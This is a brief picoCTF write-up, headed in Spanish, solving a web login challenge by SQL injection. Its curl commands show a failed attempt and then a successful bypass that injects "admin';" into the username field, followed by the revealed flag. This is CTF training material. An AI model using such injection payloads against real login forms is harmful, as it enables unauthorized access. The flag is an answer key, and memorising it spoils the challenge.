## Objetivo 

here is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649

## Solución  

```bash

                             
┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username-admin&password=password&debug=1"   

<pre>username: 
password: password
SQL query: SELECT * FROM users WHERE name='' AND password='password'
</pre><h1>Login failed.</h1>                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=password&debug=1"     

<pre>username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 


```

## Notas Adicionales 

### Referencias